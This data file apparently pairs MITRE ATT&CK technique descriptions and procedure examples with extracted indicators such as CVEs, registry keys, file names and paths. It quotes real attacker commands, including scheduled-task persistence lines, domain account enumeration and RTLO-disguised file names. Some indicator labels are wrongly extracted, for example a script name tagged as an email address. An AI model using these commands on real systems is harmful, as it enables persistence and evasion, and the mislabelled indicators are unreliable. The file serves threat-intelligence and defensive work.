T1203,Exploitation for Client Execution,Lazarus Group  has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.   [24],Procedure Examples,cve,CVE-2018-4878
T1203,Exploitation for Client Execution,"Leviathan  has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.   [57]      [58]      [59]      [60]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Leviathan  has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.   [57]      [58]      [59]      [60]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"Leviathan  has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.   [57]      [58]      [59]      [60]",Procedure Examples,cve,CVE-2017-8759
T1203,Exploitation for Client Execution,MuddyWater  has exploited the Office vulnerability CVE-2017-0199 for execution.   [61],Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,Mustang Panda  has exploited CVE-2017-0199 in Microsoft Word to execute code.   [62],Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"During  Operation Dust Storm , the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.   [63]",Procedure Examples,cve,CVE-2010-1885
T1203,Exploitation for Client Execution,"During  Operation Dust Storm , the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.   [63]",Procedure Examples,cve,CVE-2011-0611
T1203,Exploitation for Client Execution,"During  Operation Dust Storm , the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.   [63]",Procedure Examples,cve,CVE-2012-1889
T1203,Exploitation for Client Execution,"During  Operation Dust Storm , the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.   [63]",Procedure Examples,cve,CVE-2011-1255
T1203,Exploitation for Client Execution,"During  Operation Dust Storm , the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.   [63]",Procedure Examples,cve,CVE-2014-0322
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2014-4114
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2012-1856
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2015-1641
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"Patchwork  uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.   [64]      [65]      [66]      [67]      [68]      [69]      [70]",Procedure Examples,cve,CVE-2017-8570
T1203,Exploitation for Client Execution,"Ramsay  has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.   [71]      [72]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Ramsay  has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.   [71]      [72]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"Ramsay  has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.   [71]      [72]",Procedure Examples,cve,CVE-2017-8570
T1203,Exploitation for Client Execution,Sandworm Team  has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).   [73]      [74]      [75],Procedure Examples,cve,CVE-2013-3906
T1203,Exploitation for Client Execution,Sandworm Team  has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).   [73]      [74]      [75],Procedure Examples,cve,CVE-2014-4114
T1203,Exploitation for Client Execution,Sidewinder  has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.   [76]      [77],Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,Sidewinder  has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.   [76]      [77],Procedure Examples,cve,CVE-2020-0674
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,asn,ASN3
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,cve,CVE-2017-10271
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,cve,CVE-2010-1871
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,cve,CVE-2016-3088
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,cve,CVE-2018-2894
T1203,Exploitation for Client Execution,"SpeakUp  attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager.    [78]",Procedure Examples,cve,CVE-2012-0874
T1203,Exploitation for Client Execution,SUPERNOVA  was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).   [79]      [80],Procedure Examples,cve,CVE-2020-10148
T1203,Exploitation for Client Execution,TA459  has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.   [81],Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,The White Company  has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.   [82],Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,Threat Group-3390  has exploited CVE-2018-0798 in Equation Editor.   [83],Procedure Examples,cve,CVE-2018-0798
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2018-8174
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2018-0798
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2019-9489
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Tonto Team  has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.   [84]      [85]      [86]      [87]",Procedure Examples,cve,CVE-2020-8468
T1203,Exploitation for Client Execution,Transparent Tribe  has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.   [88],Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,Transparent Tribe  has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.   [88],Procedure Examples,cve,CVE-2010-3333
T1203,Exploitation for Client Execution,"Tropic Trooper  has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.   [89]      [90]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Tropic Trooper  has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.   [89]      [90]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"Tropic Trooper  has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.   [89]      [90]",Procedure Examples,cve,CVE-2018-0802
T1218.009,Regsvcs or Regasm,Agent Tesla  has dropped RegAsm.exe onto systems for performing malicious activity.   [5],Procedure Examples,file,RegAsm.exe
T1037.001,Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.   [1]    This is done via adding a path to a script to the  HKCU\Environment\UserInitMprLogonScript  Registry key.   [2]      Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",Description,registry-key,HKCU\Environment\UserInitMprLogonScript
T1037.001,Logon Script (Windows),An  APT28  loader Trojan adds the Registry key  HKCU\Environment\UserInitMprLogonScript  to establish persistence.   [3],Procedure Examples,registry-key,HKCU\Environment\UserInitMprLogonScript
T1037.001,Logon Script (Windows),Cobalt Group  has added persistence by registering the file name for the next stage malware under  HKCU\Environment\UserInitMprLogonScript .   [5],Procedure Examples,registry-key,HKCU\Environment\UserInitMprLogonScript
T1037.001,Logon Script (Windows),JHUHUGIT  has registered a Windows shell script under the Registry key  HKCU\Environment\UserInitMprLogonScript  to establish persistence.   [6]      [7],Procedure Examples,registry-key,HKCU\Environment\UserInitMprLogonScript
T1037.001,Logon Script (Windows),KGH_SPY  has the ability to set the  HKCU\Environment\UserInitMprLogonScript  Registry key to execute logon scripts.   [8],Procedure Examples,registry-key,HKCU\Environment\UserInitMprLogonScript
T1037.001,Logon Script (Windows),Zebrocy  performs persistence with a logon script via adding to the Registry key  HKCU\Environment\UserInitMprLogonScript .   [9],Procedure Examples,registry-key,HKCU\Environment\UserInitMprLogonScript
T1056.002,GUI Input Capture,SILENTTRINITY 's  credphisher.py  module can prompt a current user for their credentials.   [13],Procedure Examples,domain,credphisher.py
T1056.002,GUI Input Capture,XCSSET  prompts the user to input credentials using a native macOS dialog box leveraging the system process  /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment .   [14],Procedure Examples,url,safari.app/Contents/MacOS/SafariForWebKitDevelopment
T1056.002,GUI Input Capture,XCSSET  prompts the user to input credentials using a native macOS dialog box leveraging the system process  /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment .   [14],Procedure Examples,domain,safari.app
T1056.002,GUI Input Capture,XCSSET  prompts the user to input credentials using a native macOS dialog box leveraging the system process  /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment .   [14],Procedure Examples,path,/Applications/Safari.app
T1091,Replication Through Removable Media,Stuxnet  can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.   [23],Procedure Examples,cve,CVE-2010-2568
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,u202Excod.scr
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,rcs.docx
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,u202Egnp.js
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,photo_high_resj.png
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,regedit.exe
T1036.002,Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.   [2]      [3]    RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",Description,file,reg.exe
T1087.002,Domain Account,menuPass  has used the Microsoft administration tool csvde.exe to export Active Directory data.   [29],Procedure Examples,file,csvde.exe
T1087.002,Domain Account,MuddyWater  has used  cmd.exe net user /domain  to enumerate domain users.   [30],Procedure Examples,file,cmd.exe
T1087.002,Domain Account,SoreFang  can enumerate domain accounts via  net.exe user /domain .   [41],Procedure Examples,file,net.exe
T1595.002,Vulnerability Scanning,Aquatic Panda  has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).   [4],Procedure Examples,cve,CVE-2021-44228
T1595.002,Vulnerability Scanning,Magic Hound  has conducted widespread scanning to identify public-facing systems vulnerable to Log4j (CVE-2021-44228).   [7],Procedure Examples,cve,CVE-2021-44228
T1583.001,Domains,"Magic Hound  has registered fraudulent domains such as ""mail-newyorker.com"" and ""news12.com.recover-session-service.site"" to target specific victims with phishing attacks.   [48]",Procedure Examples,domain,mail-newyorker.com
T1583.001,Domains,"Magic Hound  has registered fraudulent domains such as ""mail-newyorker.com"" and ""news12.com.recover-session-service.site"" to target specific victims with phishing attacks.   [48]",Procedure Examples,domain,news12.com.recover-session-service.site
T1583.001,Domains,"Magic Hound  has registered fraudulent domains such as ""mail-newyorker.com"" and ""news12.com.recover-session-service.site"" to target specific victims with phishing attacks.   [48]",Procedure Examples,domain,news12.com
T1036.006,Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.   For example, if there is a Mach-O executable file called  evil.bin , when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to  evil.txt , then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to  evil.txt   (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed    [1]   .   Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",Description,domain,terminal.app
T1036.006,Space after Filename,Keydnap  puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.   [2],Procedure Examples,domain,terminal.app
T1222.002,Linux and Mac File and Directory Permissions Modification,Dok  gives all users execute permissions for the application using the command  chmod +x /Users/Shared/AppStore.app .   [5],Procedure Examples,domain,appstore.app
T1222.002,Linux and Mac File and Directory Permissions Modification,Dok  gives all users execute permissions for the application using the command  chmod +x /Users/Shared/AppStore.app .   [5],Procedure Examples,path,/Users/Shared/AppStore.app
T1053.005,Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The  schtasks  utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.   The deprecated  at  utility could also be abused by adversaries (ex:  At ), though  at.exe  can not access tasks created with  schtasks  or the Control Panel.   An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to  System Binary Proxy Execution , adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.   [1]      Adversaries may also create ""hidden"" scheduled tasks (i.e.  Hide Artifacts ) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from  schtasks /query  and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).   [2]      [3]    Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,  Index  value) within associated registry keys.   [4]",Description,file,at.exe
T1053.005,Scheduled Task,"An  APT3  downloader creates persistence by creating the following scheduled task:  schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System"" .   [13]",Procedure Examples,path,"/create /tn ""mysc"" /tr C:\Users\Public\test.exe"
T1053.005,Scheduled Task,"An  APT3  downloader creates persistence by creating the following scheduled task:  schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System"" .   [13]",Procedure Examples,file,test.exe
T1053.005,Scheduled Task,"An  APT3  downloader creates persistence by creating the following scheduled task:  schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System"" .   [13]",Procedure Examples,path,C:\Users\Public\test.exe
T1053.005,Scheduled Task,"Chimera  has used scheduled tasks to invoke Cobalt Strike including through batch script  schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st  and to maintain persistence.   [40]      [41]",Procedure Examples,path,"/create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"
T1053.005,Scheduled Task,"Chimera  has used scheduled tasks to invoke Cobalt Strike including through batch script  schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st  and to maintain persistence.   [40]      [41]",Procedure Examples,file,update.bat
T1053.005,Scheduled Task,Higaisa  dropped and added  officeupdate.exe  to scheduled tasks.   [82]      [83],Procedure Examples,file,officeupdate.exe
T1053.005,Scheduled Task,Lucifer  has established persistence by creating the following scheduled task  schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F .   [99],Procedure Examples,path,/tr C:Users\%USERPROFILE%\Downloads\spread.exe
T1053.005,Scheduled Task,Lucifer  has established persistence by creating the following scheduled task  schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F .   [99],Procedure Examples,file,spread.exe
T1053.005,Scheduled Task,menuPass  has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.   [108],Procedure Examples,email-address,script@exec.py
T1053.005,Scheduled Task,menuPass  has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.   [108],Procedure Examples,domain,exec.py
T1053.005,Scheduled Task,Naikon  has used schtasks.exe for lateral movement in compromised networks.   [117],Procedure Examples,file,schtasks.exe
T1053.005,Scheduled Task,"POWERSTATS  has established persistence through a scheduled task using the command  ""C:\Windows\system32\schtasks.exe"" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe"" .   [131]",Procedure Examples,path,C:\Windows\temp\Windows.vbe
T1053.005,Scheduled Task,"POWERSTATS  has established persistence through a scheduled task using the command  ""C:\Windows\system32\schtasks.exe"" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe"" .   [131]",Procedure Examples,path,C:\Windows\system32\schtasks.exe
T1053.005,Scheduled Task,"POWERSTATS  has established persistence through a scheduled task using the command  ""C:\Windows\system32\schtasks.exe"" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe"" .   [131]",Procedure Examples,path,"/Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe"
T1053.005,Scheduled Task,"POWERSTATS  has established persistence through a scheduled task using the command  ""C:\Windows\system32\schtasks.exe"" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe"" .   [131]",Procedure Examples,file,schtasks.exe
T1053.005,Scheduled Task,"POWERSTATS  has established persistence through a scheduled task using the command  ""C:\Windows\system32\schtasks.exe"" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR ""c:\Windows\system32\wscript.exe C:\Windows\temp\Windows.vbe"" .   [131]",Procedure Examples,file,wscript.exe
T1053.005,Scheduled Task,"SUGARDUMP  has created scheduled tasks called  MicrosoftInternetExplorerCrashRepoeterTaskMachineUA  and  MicrosoftEdgeCrashRepoeterTaskMachineUA , which were configured to execute  CrashReporter.exe  during user logon.   [164]",Procedure Examples,file,CrashReporter.exe
T1505.005,Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.   [1]       Windows Service s that are run as a ""generic"" process (ex:  svchost.exe ) load the service's DLL file, the location of which is stored in a Registry entry named  ServiceDll .   [2]    The  termsrv.dll  file, typically stored in  %SystemRoot%\System32\ , is the default  ServiceDll  value for Terminal Services in  HKLM\System\CurrentControlSet\services\TermService\Parameters\ .   Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.   [3]    Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal  termsrv.dll  functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent  Remote Desktop Protocol  sessions by either patching the  termsrv.dll  file or modifying the  ServiceDll  value to point to a DLL that provides increased RDP functionality.   [4]      [5]    On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",Description,registry-key,HKLM\System\CurrentControlSet\services\TermService\Parameters
T1505.005,Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.   [1]       Windows Service s that are run as a ""generic"" process (ex:  svchost.exe ) load the service's DLL file, the location of which is stored in a Registry entry named  ServiceDll .   [2]    The  termsrv.dll  file, typically stored in  %SystemRoot%\System32\ , is the default  ServiceDll  value for Terminal Services in  HKLM\System\CurrentControlSet\services\TermService\Parameters\ .   Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.   [3]    Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal  termsrv.dll  functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent  Remote Desktop Protocol  sessions by either patching the  termsrv.dll  file or modifying the  ServiceDll  value to point to a DLL that provides increased RDP functionality.   [4]      [5]    On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",Description,file,svchost.exe
